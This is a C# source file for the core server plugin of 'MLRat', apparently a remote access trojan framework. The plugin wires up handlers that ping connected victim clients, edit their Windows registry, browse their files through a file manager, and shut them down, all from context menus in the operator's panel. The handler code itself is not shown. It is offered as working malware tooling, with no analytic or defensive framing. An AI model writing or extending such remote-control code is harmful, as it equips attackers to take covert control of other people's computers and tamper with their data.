using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ServerPlugin.InterfaceHandle;
using MLManagementServer.Handlers;
using SharedCode.Network;

namespace MLManagementServer
{
    public class ServerPlugin : IServerPlugin
    {
        public MLPluginInfomation PluginInfomation
        {
            get
            {
                MLPluginInfomation info = new MLPluginInfomation("MLManagement")
                {
                    Developer = "BahNahNah",
                    Description = "Core Plugin"
                };
                return info;
            }
        }

        public void OnClientConnect(IClient client)
        {
            PingHandler.StartPing(client);
        }

        public void OnClientDisconnect(IClient client)
        {
            PingHandler.Disconnect(client);
            RegistryEditorHandler.Disconnect(client);
            FileExplorerHandler.Disconnect(client);
        }

        public void OnDataRetrieved(IClient client, object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];

            Console.WriteLine("Network Command: {0}", command.ToString());

            if (command == NetworkCommand.Pong) PingHandler.EndPing(client);
            if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(client, data);
            if (command == NetworkCommand.FileManager) FileExplorerHandler.Handle(client, data);
        }

        public void OnPluginLoad(IServerUIHandler UIHost)
        {
            FileExplorerHandler.SetUIHost(UIHost);


            PingHandler.Column = UIHost.AddColumn("Ping", "-");
            MLRatContextEntry network = new MLRatContextEntry()
            {
                Text = "Management",
                Icon = "management.png"
            };

            network.SubMenus = new MLRatContextEntry[]
            {
                new MLRatContextEntry(){Text = "Ping", OnClick = PingHandler.ContextCallback, Icon="Antena.png"},
                new MLRatContextEntry() {Text = "Registry Edit", OnClick = RegistryEditorHandler.ContextCallback, Icon="filestack.png" },
                new MLRatContextEntry() { Text = "File Manager", OnClick = FileExplorerHandler.ContextCallback, Icon="folder.png" },
                new MLRatContextEntry() { Text = "Close Client", OnClick = MiscHandler.CloseContextHandler, Icon="error.png" }
            };

            UIHost.AddContext(network);
        }
    }
}
